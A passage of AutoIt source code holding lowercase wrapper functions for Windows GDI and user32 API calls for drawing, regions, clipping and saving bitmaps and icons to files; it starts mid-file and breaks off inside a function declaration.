		Local $aret = DllCall("gdi32.dll", "bool", "MaskBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidth, "int", $iheight, "hwnd", $hsrcdc, "int", $ixsrc, "int", $iysrc, "handle", $hmask, "int", $ixmask, "int", $iymask, "dword", $irop)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_modifyworldtransform($hdc, ByRef $txform, $imode)
		Local $aret = DllCall("gdi32.dll", "bool", "ModifyWorldTransform", "handle", $hdc, "struct*", $txform, "dword", $imode)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_monitorfrompoint(ByRef $tpoint, $iflag = 1)
		If DllStructGetSize($tpoint) <> 8 Then Return SetError(@error + 10, @extended, 0)
		Local $aret = DllCall("user32.dll", "handle", "MonitorFromPoint", "struct", $tpoint, "dword", $iflag)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_monitorfromrect(ByRef $trect, $iflag = 1)
		Local $aret = DllCall("user32.dll", "ptr", "MonitorFromRect", "struct*", $trect, "dword", $iflag)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_monitorfromwindow($hwnd, $iflag = 1)
		Local $aret = DllCall("user32.dll", "handle", "MonitorFromWindow", "hwnd", $hwnd, "dword", $iflag)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_moveto($hdc, $ix, $iy)
		Local $aresult = DllCall("gdi32.dll", "bool", "MoveToEx", "handle", $hdc, "int", $ix, "int", $iy, "ptr", 0)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_movetoex($hdc, $ix, $iy)
		Local $tpoint = DllStructCreate($tagpoint)
		Local $aret = DllCall("gdi32.dll", "bool", "MoveToEx", "handle", $hdc, "int", $ix, "int", $iy, "struct*", $tpoint)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $tpoint
	EndFunc

	Func _winapi_offsetcliprgn($hdc, $ixoffset, $iyoffset)
		Local $aret = DllCall("gdi32.dll", "int", "OffsetClipRgn", "handle", $hdc, "int", $ixoffset, "int", $iyoffset)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_offsetpoints(ByRef $apoint, $ixoffset, $iyoffset, $istart = 0, $iend = -1)
		If __checkerrorarraybounds($apoint, $istart, $iend, 2) Then Return SetError(@error + 10, @extended, 0)
		If UBound($apoint, $ubound_columns) < 2 Then Return SetError(13, 0, 0)
		For $i = $istart To $iend
			$apoint[$i][0] += $ixoffset
			$apoint[$i][1] += $iyoffset
		Next
		Return 1
	EndFunc

	Func _winapi_offsetrect(ByRef $trect, $idx, $idy)
		Local $aret = DllCall("user32.dll", "bool", "OffsetRect", "struct*", $trect, "int", $idx, "int", $idy)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_offsetrgn($hrgn, $ixoffset, $iyoffset)
		Local $aret = DllCall("gdi32.dll", "int", "OffsetRgn", "handle", $hrgn, "int", $ixoffset, "int", $iyoffset)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_offsetwindoworg($hdc, $ixoffset, $iyoffset)
		$__g_vext = DllStructCreate($tagpoint)
		Local $aret = DllCall("gdi32.dll", "bool", "OffsetWindowOrgEx", "handle", $hdc, "int", $ixoffset, "int", $iyoffset, "struct*", $__g_vext)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_paintdesktop($hdc)
		Local $aret = DllCall("user32.dll", "bool", "PaintDesktop", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_paintrgn($hdc, $hrgn)
		Local $aret = DllCall("gdi32.dll", "bool", "PaintRgn", "handle", $hdc, "handle", $hrgn)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_patblt($hdc, $ix, $iy, $iwidth, $iheight, $irop)
		Local $aret = DllCall("gdi32.dll", "bool", "PatBlt", "handle", $hdc, "int", $ix, "int", $iy, "int", $iwidth, "int", $iheight, "dword", $irop)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_pathtoregion($hdc)
		Local $aret = DllCall("gdi32.dll", "handle", "PathToRegion", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_playenhmetafile($hdc, $hemf, ByRef $trect)
		Local $aret = DllCall("gdi32.dll", "bool", "PlayEnhMetaFile", "handle", $hdc, "handle", $hemf, "struct*", $trect)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_plgblt($hdestdc, Const ByRef $apoint, $hsrcdc, $ixsrc, $iysrc, $iwidth, $iheight, $hmask = 0, $ixmask = 0, $iymask = 0)
		If (UBound($apoint) < 3) OR (UBound($apoint, $ubound_columns) < 2) Then Return SetError(12, 0, False)
		Local $tpoints = DllStructCreate("long[2];long[2];long[2]")
		For $i = 0 To 2
			For $j = 0 To 1
				DllStructSetData($tpoints, $i + 1, $apoint[$i][$j], $j + 1)
			Next
		Next
		Local $aret = DllCall("gdi32.dll", "bool", "PlgBlt", "handle", $hdestdc, "struct*", $tpoints, "handle", $hsrcdc, "int", $ixsrc, "int", $iysrc, "int", $iwidth, "int", $iheight, "handle", $hmask, "int", $ixmask, "int", $iymask)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_polybezier($hdc, Const ByRef $apoint, $istart = 0, $iend = -1)
		If __checkerrorarraybounds($apoint, $istart, $iend, 2, 2) Then Return SetError(@error + 10, @extended, False)
		Local $ipoint = 1 + 3 * Floor(($iend - $istart) / 3)
		If $ipoint < 1 Then Return SetError(15, 0, False)
		$iend = $istart + $ipoint - 1
		Local $tagstruct = ""
		For $i = $istart To $iend
			$tagstruct &= "long[2];"
		Next
		Local $tpoint = DllStructCreate($tagstruct)
		Local $icount = 0
		For $i = $istart To $iend
			$icount += 1
			For $j = 0 To 1
				DllStructSetData($tpoint, $icount, $apoint[$i][$j], $j + 1)
			Next
		Next
		Local $aret = DllCall("gdi32.dll", "bool", "PolyBezier", "handle", $hdc, "struct*", $tpoint, "dword", $ipoint)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_polybezierto($hdc, Const ByRef $apoint, $istart = 0, $iend = -1)
		If __checkerrorarraybounds($apoint, $istart, $iend, 2, 2) Then Return SetError(@error + 10, @extended, False)
		Local $ipoint = 3 * Floor(($iend - $istart + 1) / 3)
		If $ipoint < 3 Then Return SetError(15, 0, False)
		$iend = $istart + $ipoint - 1
		Local $tagstruct = ""
		For $i = $istart To $iend
			$tagstruct &= "long[2];"
		Next
		Local $tpoint = DllStructCreate($tagstruct)
		Local $icount = 0
		For $i = $istart To $iend
			$icount += 1
			For $j = 0 To 1
				DllStructSetData($tpoint, $icount, $apoint[$i][$j], $j + 1)
			Next
		Next
		Local $aret = DllCall("gdi32.dll", "bool", "PolyBezierTo", "handle", $hdc, "struct*", $tpoint, "dword", $ipoint)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_polydraw($hdc, Const ByRef $apoint, $istart = 0, $iend = -1)
		If __checkerrorarraybounds($apoint, $istart, $iend, 2) Then Return SetError(@error + 10, @extended, 0)
		If UBound($apoint, $ubound_columns) < 3 Then Return SetError(13, 0, False)
		Local $ipoint = $iend - $istart + 1
		Local $tagstruct = ""
		For $i = $istart To $iend
			$tagstruct &= "long[2];"
		Next
		Local $tpoint = DllStructCreate($tagstruct)
		Local $ttypes = DllStructCreate("byte[" & $ipoint & "]")
		Local $icount = 0
		For $i = $istart To $iend
			$icount += 1
			For $j = 0 To 1
				DllStructSetData($tpoint, $icount, $apoint[$i][$j], $j + 1)
			Next
			DllStructSetData($ttypes, 1, $apoint[$i][2], $icount)
		Next
		Local $aret = DllCall("gdi32.dll", "bool", "PolyDraw", "handle", $hdc, "struct*", $tpoint, "struct*", $ttypes, "dword", $ipoint)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_polygon($hdc, Const ByRef $apoint, $istart = 0, $iend = -1)
		If __checkerrorarraybounds($apoint, $istart, $iend, 2, 2) Then Return SetError(@error + 10, @extended, False)
		Local $tagstruct = ""
		For $i = $istart To $iend
			$tagstruct &= "int[2];"
		Next
		Local $tdata = DllStructCreate($tagstruct)
		Local $icount = 1
		For $i = $istart To $iend
			For $j = 0 To 1
				DllStructSetData($tdata, $icount, $apoint[$i][$j], $j + 1)
			Next
			$icount += 1
		Next
		Local $aret = DllCall("gdi32.dll", "bool", "Polygon", "handle", $hdc, "struct*", $tdata, "int", $icount - 1)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_ptinrectex($ix, $iy, $ileft, $itop, $iright, $ibottom)
		Local $trect = _winapi_createrect($ileft, $itop, $iright, $ibottom)
		Local $tpoint = _winapi_createpoint($ix, $iy)
		Local $aret = DllCall("user32.dll", "bool", "PtInRect", "struct*", $trect, "struct", $tpoint)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_ptinregion($hrgn, $ix, $iy)
		Local $aret = DllCall("gdi32.dll", "bool", "PtInRegion", "handle", $hrgn, "int", $ix, "int", $iy)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_ptvisible($hdc, $ix, $iy)
		Local $aret = DllCall("gdi32.dll", "bool", "PtVisible", "handle", $hdc, "int", $ix, "int", $iy)
		If @error Then Return SetError(@error + 10, @extended, 0)
		If $aret[0] = -1 Then Return SetError(10, $aret[0], 0)
		Return $aret[0]
	EndFunc

	Func _winapi_radialgradientfill($hdc, $ix, $iy, $iradius, $irgb1, $irgb2, $fanglestart = 0, $fangleend = 360, $fstep = 5)
		If Abs($fanglestart) > 360 Then
			$fanglestart = Mod($fanglestart, 360)
		EndIf
		If Abs($fangleend) > 360 Then
			$fangleend = Mod($fangleend, 360)
		EndIf
		If ($fanglestart < 0) OR ($fangleend < 0) Then
			$fanglestart += 360
			$fangleend += 360
		EndIf
		If $fanglestart > $fangleend Then
			Local $fval = $fanglestart
			$fanglestart = $fangleend
			$fangleend = $fval
		EndIf
		If $fstep < 1 Then
			$fstep = 1
		EndIf
		Local $fki = ATan(1) / 45
		Local $ixp = Round($ix + $iradius * Cos($fki * $fanglestart))
		Local $iyp = Round($iy + $iradius * Sin($fki * $fanglestart))
		Local $ixn, $iyn, $fan = $fanglestart
		Local $avertex[3][3]
		While $fan < $fangleend
			$fan += $fstep
			If $fan > $fangleend Then
				$fan = $fangleend
			EndIf
			$ixn = Round($ix + $iradius * Cos($fki * $fan))
			$iyn = Round($iy + $iradius * Sin($fki * $fan))
			$avertex[0][0] = $ix
			$avertex[0][1] = $iy
			$avertex[0][2] = $irgb1
			$avertex[1][0] = $ixp
			$avertex[1][1] = $iyp
			$avertex[1][2] = $irgb2
			$avertex[2][0] = $ixn
			$avertex[2][1] = $iyn
			$avertex[2][2] = $irgb2
			If NOT _winapi_gradientfill($hdc, $avertex, 0, 2) Then
				Return SetError(@error, @extended, 0)
			EndIf
			$ixp = $ixn
			$iyp = $iyn
		WEnd
		Return 1
	EndFunc

	Func _winapi_rectangle($hdc, $trect)
		Local $aret = DllCall("gdi32.dll", "bool", "Rectangle", "handle", $hdc, "int", DllStructGetData($trect, 1), "int", DllStructGetData($trect, 2), "int", DllStructGetData($trect, 3), "int", DllStructGetData($trect, 4))
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_rectinregion($hrgn, $trect)
		Local $aret = DllCall("gdi32.dll", "bool", "RectInRegion", "handle", $hrgn, "struct*", $trect)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_rectisempty(ByRef $trect)
		Return (DllStructGetData($trect, "Left") = 0) AND (DllStructGetData($trect, "Top") = 0) AND (DllStructGetData($trect, "Right") = 0) AND (DllStructGetData($trect, "Bottom") = 0)
	EndFunc

	Func _winapi_rectvisible($hdc, $trect)
		Local $aret = DllCall("gdi32.dll", "bool", "RectVisible", "handle", $hdc, "struct*", $trect)
		If @error Then Return SetError(@error, @extended, 0)
		Switch $aret[0]
			Case 0, 1, 2
			Case Else
				Return SetError(10, $aret[0], 0)
		EndSwitch
		Return $aret[0]
	EndFunc

	Func _winapi_removefontmemresourceex($hfont)
		Local $aret = DllCall("gdi32.dll", "bool", "RemoveFontMemResourceEx", "handle", $hfont)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_removefontresourceex($sfont, $iflag = 0, $bnotify = False)
		Local $aret = DllCall("gdi32.dll", "bool", "RemoveFontResourceExW", "wstr", $sfont, "dword", $iflag, "ptr", 0)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, False)
		If $bnotify Then
			Local Const $wm_fontchange = 29
			Local Const $hwnd_broadcast = 65535
			DllCall("user32.dll", "none", "SendMessage", "hwnd", $hwnd_broadcast, "uint", $wm_fontchange, "wparam", 0, "lparam", 0)
		EndIf
		Return $aret[0]
	EndFunc

	Func _winapi_rgb($ired, $igreen, $iblue)
		Return __rgb(BitOR(BitShift($iblue, -16), BitShift($igreen, -8), $ired))
	EndFunc

	Func _winapi_rotatepoints(ByRef $apoint, $ixc, $iyc, $fangle, $istart = 0, $iend = -1)
		If __checkerrorarraybounds($apoint, $istart, $iend, 2) Then Return SetError(@error + 10, @extended, 0)
		If UBound($apoint, $ubound_columns) < 2 Then Return SetError(13, 0, 0)
		Local $fcos = Cos(ATan(1) / 45 * $fangle)
		Local $fsin = Sin(ATan(1) / 45 * $fangle)
		Local $ixn, $iyn
		For $i = $istart To $iend
			$ixn = $apoint[$i][0] - $ixc
			$iyn = $apoint[$i][1] - $iyc
			$apoint[$i][0] = $ixc + Round($ixn * $fcos - $iyn * $fsin)
			$apoint[$i][1] = $iyc + Round($ixn * $fsin + $iyn * $fcos)
		Next
		Return 1
	EndFunc

	Func _winapi_roundrect($hdc, $trect, $iwidth, $iheight)
		Local $aret = DllCall("gdi32.dll", "bool", "RoundRect", "handle", $hdc, "int", DllStructGetData($trect, 1), "int", DllStructGetData($trect, 2), "int", DllStructGetData($trect, 3), "int", DllStructGetData($trect, 4), "int", $iwidth, "int", $iheight)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_savehbitmaptofile($sfilepath, $hbitmap, $ixpelspermeter = Default, $iypelspermeter = Default)
		Local $tbmp = DllStructCreate("align 1;ushort bfType;dword bfSize;ushort bfReserved1;ushort bfReserved2;dword bfOffset")
		Local $tdib = DllStructCreate($tagdibsection)
		Local $hdc, $hsv, $hsource = 0
		While $hbitmap
			If (NOT _winapi_getobject($hbitmap, DllStructGetSize($tdib), $tdib)) OR (DllStructGetData($tdib, "biCompression")) Then
				$hbitmap = 0
			Else
				Switch DllStructGetData($tdib, "bmBitsPixel")
					Case 32
						If NOT _winapi_isalphabitmap($hbitmap) Then
							If NOT $hsource Then
								$hsource = _winapi_createdib(DllStructGetData($tdib, "bmWidth"), DllStructGetData($tdib, "bmHeight"), 24)
								If NOT $hsource Then
									$hbitmap = 0
								EndIf
								$hdc = _winapi_createcompatibledc(0)
								$hsv = _winapi_selectobject($hdc, $hsource)
								If _winapi_drawbitmap($hdc, 0, 0, $hbitmap) Then
									$hbitmap = $hsource
								Else
									$hbitmap = 0
								EndIf
								_winapi_selectobject($hdc, $hsv)
								_winapi_deletedc($hdc)
							Else
								$hbitmap = 0
							EndIf
							ContinueLoop
						EndIf
					Case Else
				EndSwitch
				If (NOT DllStructGetData($tdib, "bmBits")) OR (NOT DllStructGetData($tdib, "biSizeImage")) Then
					If NOT $hsource Then
						$hbitmap = _winapi_copybitmap($hbitmap)
						$hsource = $hbitmap
					Else
						$hbitmap = 0
					EndIf
				Else
					ExitLoop
				EndIf
			EndIf
		WEnd
		Local $hfile = 0, $ierror = 0, $iresult = 0
		Do
			If NOT $hbitmap Then
				$ierror = 1
				ExitLoop
			EndIf
			Local $adata[4][2]
			$adata[0][0] = DllStructGetPtr($tbmp)
			$adata[0][1] = DllStructGetSize($tbmp)
			$adata[1][0] = DllStructGetPtr($tdib, "biSize")
			$adata[1][1] = 40
			$adata[2][1] = DllStructGetData($tdib, "biClrUsed") * 4
			Local $ttable = 0
			If $adata[2][1] Then
				$ttable = _winapi_getdibcolortable($hbitmap)
				If @error OR (@extended <> $adata[2][1] / 4) Then
					$ierror = @error + 10
					ExitLoop
				EndIf
			EndIf
			$adata[2][0] = DllStructGetPtr($ttable)
			$adata[3][0] = DllStructGetData($tdib, "bmBits")
			$adata[3][1] = DllStructGetData($tdib, "biSizeImage")
			DllStructSetData($tbmp, "bfType", 19778)
			DllStructSetData($tbmp, "bfSize", $adata[0][1] + $adata[1][1] + $adata[2][1] + $adata[3][1])
			DllStructSetData($tbmp, "bfReserved1", 0)
			DllStructSetData($tbmp, "bfReserved2", 0)
			DllStructSetData($tbmp, "bfOffset", $adata[0][1] + $adata[1][1] + $adata[2][1])
			$hdc = _winapi_getdc(0)
			If $ixpelspermeter = Default Then
				If NOT DllStructGetData($tdib, "biXPelsPerMeter") Then
					DllStructSetData($tdib, "biXPelsPerMeter", _winapi_getdevicecaps($hdc, 8) / _winapi_getdevicecaps($hdc, 4) * 1000)
				EndIf
			Else
				DllStructSetData($tdib, "biXPelsPerMeter", $ixpelspermeter)
			EndIf
			If $iypelspermeter = Default Then
				If NOT DllStructGetData($tdib, "biYPelsPerMeter") Then
					DllStructSetData($tdib, "biYPelsPerMeter", _winapi_getdevicecaps($hdc, 10) / _winapi_getdevicecaps($hdc, 6) * 1000)
				EndIf
			Else
				DllStructSetData($tdib, "biYPelsPerMeter", $iypelspermeter)
			EndIf
			_winapi_releasedc(0, $hdc)
			$hfile = _winapi_createfile($sfilepath, 1, 4)
			If @error Then
				$ierror = @error + 20
				ExitLoop
			EndIf
			Local $ibytes
			For $i = 0 To 3
				If $adata[$i][1] Then
					If NOT _winapi_writefile($hfile, $adata[$i][0], $adata[$i][1], $ibytes) Then
						$ierror = @error + 30
						ExitLoop 2
					EndIf
				EndIf
			Next
			$iresult = 1
		Until 1
		If $hsource Then
			_winapi_deleteobject($hsource)
		EndIf
		_winapi_closehandle($hfile)
		If NOT $iresult Then
			FileDelete($sfilepath)
		EndIf
		Return SetError($ierror, 0, $iresult)
	EndFunc

	Func _winapi_savehicontofile($sfilepath, Const ByRef $vicon, $bcompress = 0, $istart = 0, $iend = -1)
		Local $aicon, $atemp, $icount = 1
		If NOT IsArray($vicon) Then
			Dim $aicon[1] = [$vicon]
			Dim $atemp[1] = [0]
		Else
			If __checkerrorarraybounds($vicon, $istart, $iend) Then Return SetError(@error + 10, @extended, 0)
			$icount = $iend - $istart + 1
			If $icount Then
				Dim $aicon[$icount]
				Dim $atemp[$icount]
				For $i = 0 To $icount - 1
					$aicon[$i] = $vicon[$istart + $i]
					$atemp[$i] = 0
				Next
			EndIf
		EndIf
		Local $hfile = _winapi_createfile($sfilepath, 1, 4)
		If @error Then Return SetError(@error + 20, @extended, 0)
		Local $tico = DllStructCreate("align 1;ushort Reserved;ushort Type;ushort Count;byte Data[" & (16 * $icount) & "]")
		Local $ilength = DllStructGetSize($tico)
		Local $tbi = DllStructCreate($tagbitmapinfoheader)
		Local $tii = DllStructCreate($tagiconinfo)
		Local $tdib = DllStructCreate($tagdibsection)
		Local $idib = DllStructGetSize($tdib)
		Local $pdib = DllStructGetPtr($tdib)
		Local $ioffset = $ilength
		DllStructSetData($tbi, "biSize", 40)
		DllStructSetData($tbi, "biPlanes", 1)
		DllStructSetData($tbi, "biXPelsPerMeter", 0)
		DllStructSetData($tbi, "biYPelsPerMeter", 0)
		DllStructSetData($tbi, "biClrUsed", 0)
		DllStructSetData($tbi, "biClrImportant", 0)
		DllStructSetData($tico, "Reserved", 0)
		DllStructSetData($tico, "Type", 1)
		DllStructSetData($tico, "Count", $icount)
		Local $iresult = 0, $ierror = 0, $ibytes
		Local $ainfo[8], $aret, $pdata = 0, $iindex = 0
		Local $asize[2], $tdata = 0
		Do
			If NOT _winapi_writefile($hfile, $tico, $ilength, $ibytes) Then
				$ierror = @error + 30
				ExitLoop
			EndIf
			While $icount > $iindex
				$aret = DllCall("user32.dll", "bool", "GetIconInfo", "handle", $aicon[$iindex], "struct*", $tii)
				If @error OR NOT $aret[0] Then
					$ierror = @error + 40
					ExitLoop 2
				EndIf
				For $i = 4 To 5
					$ainfo[$i] = _winapi_copyimage(DllStructGetData($tii, $i), 0, 0, 0, 8200)
					If _winapi_getobject($ainfo[$i], $idib, $pdib) Then
						$ainfo[$i - 4] = DllStructGetData($tdib, "biSizeImage")
						$ainfo[$i - 2] = DllStructGetData($tdib, "bmBits")
					Else
						$ierror = @error + 50
					EndIf
				Next
				$ainfo[6] = 40
				$ainfo[7] = DllStructGetData($tdib, "bmBitsPixel")
				Switch $ainfo[7]
					Case 16, 24
					Case 32
						If NOT _winapi_isalphabitmap($ainfo[5]) Then
							If NOT $atemp[$iindex] Then
								$aicon[$iindex] = _winapi_create32bithicon($aicon[$iindex])
								$atemp[$iindex] = $aicon[$iindex]
								If NOT @error Then
									ContinueLoop
								Else
									ContinueCase
								EndIf
							EndIf
						Else
							If ($ainfo[1] >= 256 * 256 * 4) AND ($bcompress) Then
								$ibytes = _winapi_compressbitmapbits($ainfo[5], $pdata)
								If NOT @error Then
									$ainfo[0] = 0
									$ainfo[1] = $ibytes
									$ainfo[2] = 0
									$ainfo[3] = $pdata
									$ainfo[6] = 0
								EndIf
							EndIf
						EndIf
					Case Else
						$ierror = 60
				EndSwitch
				If NOT $ierror Then
					$tdata = DllStructCreate("byte Width;byte Height;byte ColorCount;byte Reserved;ushort Planes;ushort BitCount;long Size;long Offset", DllStructGetPtr($tico) + 6 + 16 * $iindex)
					DllStructSetData($tdata, "ColorCount", 0)
					DllStructSetData($tdata, "Reserved", 0)
					DllStructSetData($tdata, "Planes", 1)
					DllStructSetData($tdata, "BitCount", $ainfo[7])
					DllStructSetData($tdata, "Size", $ainfo[0] + $ainfo[1] + $ainfo[6])
					DllStructSetData($tdata, "Offset", $ioffset)
					For $i = 0 To 1
						$asize[$i] = DllStructGetData($tdib, $i + 2)
						If $asize[$i] < 256 Then
							DllStructSetData($tdata, $i + 1, $asize[$i])
						Else
							DllStructSetData($tdata, $i + 1, 0)
						EndIf
					Next
					DllStructSetData($tbi, "biWidth", $asize[0])
					DllStructSetData($tbi, "biHeight", 2 * $asize[1])
					DllStructSetData($tbi, "biBitCount", $ainfo[7])
					DllStructSetData($tbi, "biCompression", 0)
					DllStructSetData($tbi, "biSizeImage", $ainfo[0] + $ainfo[1])
					$ioffset += $ainfo[0] + $ainfo[1] + $ainfo[6]
					Do
						If $ainfo[6] Then
							If NOT _winapi_writefile($hfile, $tbi, $ainfo[6], $ibytes) Then
								$ierror = @error + 70
								ExitLoop
							EndIf
							For $i = 1 To 0 Step -1
								If NOT _winapi_writefile($hfile, $ainfo[$i + 2], $ainfo[$i], $ibytes) Then
									$ierror = @error + 80
									ExitLoop 2
								EndIf
							Next
						Else
							If NOT _winapi_writefile($hfile, $ainfo[3], $ainfo[1], $ibytes) Then
								$ierror = @error + 90
								ExitLoop
							EndIf
						EndIf
					Until 1
				EndIf
				For $i = 4 To 5
					_winapi_deleteobject($ainfo[$i])
				Next
				If $ierror Then
					ExitLoop 2
				EndIf
				$iindex += 1
			WEnd
			$aret = DllCall("kernel32.dll", "bool", "SetFilePointerEx", "handle", $hfile, "int64", 0, "int64*", 0, "dword", 0)
			If @error OR NOT $aret[0] Then
				$ierror = @error + 100
				ExitLoop
			EndIf
			If NOT _winapi_writefile($hfile, $tico, $ilength, $ibytes) Then
				$ierror = @error + 110
				ExitLoop
			EndIf
			$iresult = 1
		Until 1
		For $i = 0 To $icount - 1
			If $atemp[$i] Then
				_winapi_destroyicon($atemp[$i])
			EndIf
		Next
		If $pdata Then
			__heapfree($pdata)
		EndIf
		_winapi_closehandle($hfile)
		If NOT $iresult Then
			FileDelete($sfilepath)
		EndIf
		Return SetError($ierror, 0, $iresult)
	EndFunc

	Func _winapi_scalewindowext($hdc, $ixnum, $ixdenom, $iynum, $iydenom)
		$__g_vext = DllStructCreate($tagsize)
		Local $aret = DllCall("gdi32.dll", "bool", "ScaleWindowExtEx", "handle", $hdc, "int", $ixnum, "int", $ixdenom, "int", $iynum, "int", $iydenom, "struct*", $__g_vext)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_selectclippath($hdc, $imode = 5)
		Local $aret = DllCall("gdi32.dll", "bool", "SelectClipPath", "handle", $hdc, "int", $imode)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_selectcliprgn($hdc, $hrgn)
		Local $aret = DllCall("gdi32.dll", "int", "SelectClipRgn", "handle", $hdc, "handle", $hrgn)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_setarcdirection($hdc, $idirection)
		Local $aret = DllCall("gdi32.dll", "int", "SetArcDirection", "handle", $hdc, "int", $idirection)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_setbitmapbits($hbitmap, $isize, $pbits)
		Local $aret = DllCall("gdi32.dll", "long", "SetBitmapBits", "handle", $hbitmap, "dword", $isize, "struct*", $pbits)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_setbitmapdimensionex($hbitmap, $iwidth, $iheight)
		$__g_vext = DllStructCreate($tagsize)
		Local $aret = DllCall("gdi32.dll", "bool", "SetBitmapDimensionEx", "handle", $hbitmap, "int", $iwidth, "int", $iheight, "struct*", $__g_vext)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setboundsrect($hdc, $iflags, $trect = 0)
		Local $aret = DllCall("gdi32.dll", "uint", "SetBoundsRect", "handle", $hdc, "struct*", $trect, "uint", $iflags)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setbrushorg($hdc, $ix, $iy)
		$__g_vext = DllStructCreate($tagpoint)
		Local $aret = DllCall("gdi32.dll", "bool", "SetBrushOrgEx", "handle", $hdc, "int", $ix, "int", $iy, "struct*", $__g_vext)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setcoloradjustment($hdc, $tadjustment)
		Local $aret = DllCall("gdi32.dll", "bool", "SetColorAdjustment", "handle", $hdc, "struct*", $tadjustment)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_setdcbrushcolor($hdc, $irgb)
		Local $aret = DllCall("gdi32.dll", "dword", "SetDCBrushColor", "handle", $hdc, "dword", __rgb($irgb))
		If @error OR ($aret[0] = 4294967295) Then Return SetError(@error, @extended, -1)
		Return __rgb($aret[0])
	EndFunc

	Func _winapi_setdcpencolor($hdc, $irgb)
		Local $aret = DllCall("gdi32.dll", "dword", "SetDCPenColor", "handle", $hdc, "dword", __rgb($irgb))
		If @error OR ($aret[0] = 4294967295) Then Return SetError(@error, @extended, -1)
		Return __rgb($aret[0])
	EndFunc

	Func _winapi_setdevicegammaramp($hdc, Const ByRef $aramp)
		If (UBound($aramp, $ubound_dimensions) <> 2) OR (UBound($aramp, $ubound_rows) <> 256) OR (UBound($aramp, $ubound_columns) <> 3) Then
			Return SetError(12, 0, 0)
		EndIf
		Local $tdata = DllStructCreate("ushort[256];ushort[256];ushort[256]")
		For $i = 0 To 2
			For $j = 0 To 255
				DllStructSetData($tdata, $i + 1, $aramp[$j][$i], $j + 1)
			Next
		Next
		Local $aret = DllCall("gdi32.dll", "bool", "SetDeviceGammaRamp", "handle", $hdc, "struct*", $tdata)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_setdibcolortable($hbitmap, $tcolortable, $icolorcount)
		If $icolorcount > DllStructGetSize($tcolortable) / 4 Then Return SetError(1, 0, 0)
		Local $hdc = _winapi_createcompatibledc(0)
		Local $hsv = _winapi_selectobject($hdc, $hbitmap)
		Local $ierror = 0
		Local $aret = DllCall("gdi32.dll", "uint", "SetDIBColorTable", "handle", $hdc, "uint", 0, "uint", $icolorcount, "struct*", $tcolortable)
		If @error Then $ierror = @error
		_winapi_selectobject($hdc, $hsv)
		_winapi_deletedc($hdc)
		If $ierror Then Return SetError($ierror, 0, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_setdibits($hdc, $hbitmap, $istartscan, $iscanlines, $pbits, $tbmi, $icoloruse = 0)
		Local $aresult = DllCall("gdi32.dll", "int", "SetDIBits", "handle", $hdc, "handle", $hbitmap, "uint", $istartscan, "uint", $iscanlines, "struct*", $pbits, "struct*", $tbmi, "INT", $icoloruse)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_setdibitstodevice($hdc, $ixdest, $iydest, $iwidth, $iheight, $ixsrc, $iysrc, $istartscan, $iscanlines, $tbitmapinfo, $iusage, $pbits)
